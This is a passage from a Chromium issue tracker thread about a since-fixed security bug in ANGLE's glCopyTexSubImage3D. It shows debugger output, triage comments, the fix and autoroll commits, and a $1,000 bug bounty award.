*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
1e 0000000d`7c9ffa50 00007ffd`eb927ad1 KERNEL32!BaseThreadInitThunk+0x14
1f 0000000d`7c9ffa80 00000000`00000000 ntdll!RtlUserThreadStart+0x21
3:034> lmv m chrome
Browse full module list
start             end                 module name
00007ff7`aff30000 00007ff7`b00e1000   chrome     (private pdb symbols)  c:\symcache\chrome\chrome.exe.pdb\84BD5A4757E802AF4C4C44205044422E1\chrome.exe.pdb
    Loaded symbol image file: C:\Program Files (x86)\Google\Chrome\Application\chrome.exe
    Image path: chrome.exe
    Image name: chrome.exe
    Browse all global symbols  functions  data
    Timestamp:        Mon Mar 18 22:00:00 2019 (5C907750)
    CheckSum:         001B29BF
    ImageSize:        001B1000
    File version:     73.0.3683.86
    Product version:  73.0.3683.86
    File flags:       0 (Mask 17)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04b0
    Information from resource tables:
        CompanyName:      Google Inc.
        ProductName:      Google Chrome
        InternalName:     chrome_exe
        OriginalFilename: chrome.exe
        ProductVersion:   73.0.3683.86
        FileVersion:      73.0.3683.86
        FileDescription:  Google Chrome
        LegalCopyright:   Copyright 2018 Google Inc. All rights reserved.


### sh...@chromium.org (2019-03-29)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dr...@chromium.org (2019-04-01)

I'm still having trouble reproducing the bug, but I suspect that has to do with my ignorance about ANGLE. cc'ing a few ANGLE owners - jmadill@, geofflang@, do you mind taking a look?

[Monorail components: Internals>GPU>ANGLE]

### cl...@chromium.org (2019-04-03)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-08)

Will take a look at this.

### jm...@chromium.org (2019-04-08)

Thanks for the repro. Should be a simple fix.

[Monorail components: Blink>WebGL]

### jm...@chromium.org (2019-04-08)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/e4458b7bb63a94149ef04a6d00391bb549945cee

commit e4458b7bb63a94149ef04a6d00391bb549945cee
Author: Jamie Madill <jmadill@chromium.org>
Date: Tue Apr 09 20:13:58 2019

Fix glCopyTexSubImage3D.

Two bugs were present in our implementation. We were using the y offset
for z in ensureSubImageInitialized. And for our D3D back-end we were
potentially reading from the wrong image index.

Bug: chromium:947342
Change-Id: If39671a911e08fcc641b9ba6f5910e3a2c16eb5d
Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/1558671
Commit-Queue: Jamie Madill <jmadill@chromium.org>
Reviewed-by: Jonah Ryan-Davis <jonahr@google.com>

[modify] https://crrev.com/e4458b7bb63a94149ef04a6d00391bb549945cee/src/tests/gl_tests/CopyTexImageTest.cpp
[modify] https://crrev.com/e4458b7bb63a94149ef04a6d00391bb549945cee/src/libANGLE/Context.cpp
[modify] https://crrev.com/e4458b7bb63a94149ef04a6d00391bb549945cee/src/libANGLE/Texture.cpp
[modify] https://crrev.com/e4458b7bb63a94149ef04a6d00391bb549945cee/src/libANGLE/Texture.h


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-04-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/96ab94f59ee5dad7ed6fc5c272592e91d1c7b7f6

commit 96ab94f59ee5dad7ed6fc5c272592e91d1c7b7f6
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Apr 09 22:10:00 2019

Roll src/third_party/angle 3702d8c9d300..e4458b7bb63a (3 commits)

https://chromium.googlesource.com/angle/angle.git/+log/3702d8c9d300..e4458b7bb63a


git log 3702d8c9d300..e4458b7bb63a --date=short --no-merges --format='%ad %ae %s'
2019-04-09 jmadill@chromium.org Fix glCopyTexSubImage3D.
2019-04-09 syoussefi@chromium.org Rename getCurrentDisplay to getDisplay
2019-04-09 syoussefi@chromium.org Vulkan: fix CPU throttling frames to 2


Created with:
  gclient setdep -r src/third_party/angle@e4458b7bb63a

The AutoRoll server is located here: https://autoroll.skia.org/r/angle-chromium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.

CQ_INCLUDE_TRYBOTS=luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel

BUG=chromium:947342,chromium:None
TBR=ynovikov@chromium.org

Change-Id: I21e6846bc8a27c2cf8a714900a4cbaede701cbe8
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1560225
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#649290}
[modify] https://crrev.com/96ab94f59ee5dad7ed6fc5c272592e91d1c7b7f6/DEPS


### jm...@chromium.org (2019-04-10)

Should be fixed in tomorrow's Canary.

### jm...@chromium.org (2019-04-10)

[Empty comment from Monorail migration]

### na...@google.com (2019-04-10)

[Empty comment from Monorail migration]

### jm...@chromium.org (2019-04-10)

[Empty comment from Monorail migration]

### na...@google.com (2019-04-10)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### na...@google.com (2019-04-10)

Congrats! The Panel decided to reward $1,000 for this report! 

### na...@google.com (2019-04-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-04-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-05-03)

Not requesting merge to M75 because latest trunk commit (649290) appears to be prior to beta branch point (652427). If this is incorrect, please replace the Merge-na label with Merge-Request-75. If other changes are required to fix this bug completely, please request a merge if necessary.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2019-06-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2019-06-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-07-18)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-07-18)

This issue was migrated from crbug.com/chromium/947342?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals>GPU>ANGLE]
[Monorail blocking: crbug.com/angleproject/3356, crbug.com/chromium/951451]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40094428)*
